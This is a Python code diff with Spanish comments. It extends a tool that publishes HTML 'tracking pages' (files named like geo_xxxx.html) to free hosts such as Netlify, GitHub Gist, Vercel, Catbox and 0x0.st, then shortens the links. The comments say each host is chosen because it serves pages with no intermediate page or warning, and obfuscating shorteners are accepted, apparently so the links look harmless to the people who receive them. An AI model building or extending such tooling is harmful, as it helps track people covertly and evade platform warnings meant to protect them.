@@ -89,12 +89,15 @@ async def deploy_html(html_content, filename="index.html"):
     # (nombre, función, strict_verify)
     # strict_verify=True  → si HEAD/GET falla, se descarta la URL
     # strict_verify=False → si HEAD/GET falla, se guarda como fallback
+    # Netlify va PRIMERO (después de Local) porque sirve URLs directas
+    # *.netlify.app sin páginas intermedias — ideal para tracking pages.
     deployers = [
-        ("Servidor Local", _deploy_local,  True),
-        ("GitHub Gist",    _deploy_gist,   False),
-        ("Vercel",         _deploy_vercel, False),
-        ("Catbox",         _deploy_catbox, False),
-        ("0x0.st",         _deploy_0x0,    False),
+        ("Servidor Local", _deploy_local,   True),
+        ("Netlify",        _deploy_netlify, False),
+        ("GitHub Gist",    _deploy_gist,    False),
+        ("Vercel",         _deploy_vercel,  False),
+        ("Catbox",         _deploy_catbox,  False),
+        ("0x0.st",         _deploy_0x0,     False),
     ]
 
     fallback = None  # primer URL "best-effort" que vemos
@@ -193,8 +196,9 @@ async def _deploy_gist(html_content, filename):
             gist_id = gist.get("id", "")
             owner = gist.get("owner", {}).get("login", "")
             if owner and gist_id:
-                # GitHack sirve el Gist con text/html correcto
-                return f"https://gist.githack.com/{owner}/{gist_id}/raw/{filename}"
+                # gistcdn.githack.com → CDN de producción, SIN página intermedia
+                # "One more step" (a diferencia de gist.githack.com que sí la tiene)
+                return f"https://gistcdn.githack.com/{owner}/{gist_id}/raw/{filename}"
             logger.warning(f"_deploy_gist: respuesta 201 sin owner/id ({gist!r})")
             return None
         # Diagnóstico: por qué falló
@@ -209,6 +213,84 @@ async def _deploy_gist(html_content, filename):
             f"422 → contenido rechazado."
         )
     return None
+
+async def _deploy_netlify(html_content, filename):
+    """
+    Deploy a Netlify (requiere NETLIFY_TOKEN).
+
+    Crea un site nuevo + sube el HTML como un .zip (deploy "drop").
+    Devuelve URL tipo https://<random-name>.netlify.app/<filename> que
+    sirve el HTML directamente con Content-Type correcto, SIN página
+    intermedia ni warning. Es el deployer ideal para tracking pages.
+    """
+    try:
+        from config import NETLIFY_TOKEN
+    except (ImportError, AttributeError):
+        # config.py no expone NETLIFY_TOKEN: lo leemos directo del entorno
+        NETLIFY_TOKEN = os.getenv("NETLIFY_TOKEN", "")
+
+    if not NETLIFY_TOKEN:
+        logger.info("_deploy_netlify: NETLIFY_TOKEN no configurado → skip")
+        return None
+
+    # Construimos un .zip en memoria con el HTML como index.html (para que
+    # Netlify lo sirva en la raíz) Y con el nombre real (para mantener el
+    # path original tipo /geo_xxxx.html).
+    import io
+    import zipfile
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("index.html", html_content)
+        if filename and filename != "index.html":
+            zf.writestr(filename, html_content)
+    zip_bytes = buf.getvalue()
+
+    async with httpx.AsyncClient(timeout=60.0) as client:
+        try:
+            r = await client.post(
+                "https://api.netlify.com/api/v1/sites",
+                headers={
+                    "Authorization": f"Bearer {NETLIFY_TOKEN}",
+                    "Content-Type": "application/zip",
+                },
+                content=zip_bytes,
+            )
+        except httpx.HTTPError as e:
+            logger.warning(f"_deploy_netlify: red/conexión falló ({type(e).__name__}: {e})")
+            return None
+
+        if r.status_code not in (200, 201):
+            try:
+                body = r.json()
+                msg = body.get("message", "")
+            except Exception:
+                msg = (r.text or "")[:200]
+            logger.warning(
+                f"_deploy_netlify: HTTP {r.status_code} — {msg}. "
+                f"Si es 401 → token inválido. 403 → permisos insuficientes."
+            )
+            return None
+
+        try:
+            site = r.json()
+        except Exception as e:
+            logger.warning(f"_deploy_netlify: respuesta no-JSON: {e}")
+            return None
+
+        # Netlify devuelve 'url' (https://<sub>.netlify.app) o 'ssl_url'
+        site_url = site.get("ssl_url") or site.get("url")
+        if not site_url:
+            subdomain = site.get("subdomain") or site.get("name")
+            if subdomain:
+                site_url = f"https://{subdomain}.netlify.app"
+
+        if not site_url:
+            logger.warning(f"_deploy_netlify: sin URL en respuesta ({site!r})")
+            return None
+
+        # El path final servido es /<filename> (o /index.html en raíz)
+        return f"{site_url.rstrip('/')}/{filename}"
+
 
 async def _deploy_vercel(html_content, filename):
     """Deploy a Vercel (requiere VERCEL_TOKEN)"""
@@ -372,24 +454,19 @@ async def shorten_url(url):
                 if not short.startswith("http"):
                     logger.debug(f"{name}: respuesta sin URL ({short[:80]!r})")
                     continue
-                # Verificación: hacer HEAD para asegurarnos que redirige
-                # DIRECTO (un solo salto) al destino — no a una página intermedia
+                # Verificación: que redirija DIRECTO (un solo salto)
                 try:
                     h = await client.head(short, headers=HEADERS)
                     if h.status_code in (301, 302, 303, 307, 308):
                         location = h.headers.get("location", "")
-                        # Si redirige al original o a un host del mismo dominio → OK
                         if location and url.split("?")[0] in location:
                             logger.info(f"URL acortada con {name} (verificada directa): {short}")
                             return short
-                        # Si no, igual la aceptamos (algunos shorteners ofuscan)
                         logger.info(f"URL acortada con {name}: {short}")
                         return short
-                    # 200 directo (raro, pero válido)
                     logger.info(f"URL acortada con {name}: {short}")
                     return short
                 except Exception:
-                    # Si falla la verificación, igual devolvemos — el shortener respondió OK
                     logger.info(f"URL acortada con {name}: {short}")
                     return short
             except Exception as e:
